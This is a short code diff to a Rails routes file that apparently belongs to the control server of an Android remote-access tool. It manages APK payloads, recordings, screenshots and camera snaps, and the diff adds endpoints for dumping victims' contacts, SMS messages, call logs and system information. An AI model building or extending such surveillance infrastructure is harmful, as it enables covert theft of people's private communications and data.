@@ -1,10 +1,22 @@
 Rails.application.routes.draw do
   resources :apk_installations
   resources :apk_payloads
-  resources :contacts
+  resources :contacts do
+    collection do
+        post :dump_contacts
+    end
+end
   resources :geo_locations
-  resources :sms_messages
-  resources :call_logs
+  resources :sms_messages do
+    collection do
+        post :dump_messages
+    end
+end
+  resources :call_logs do
+    collection do
+        post :dump_calllogs
+    end
+end
   resources :recordings
   resources :videos
   resources :screenshots
@@ -21,6 +33,7 @@ end
         post :front_camera_snap
         post :select_smartphone
         post :take_picture
+        post :system_info
     end
   end
   
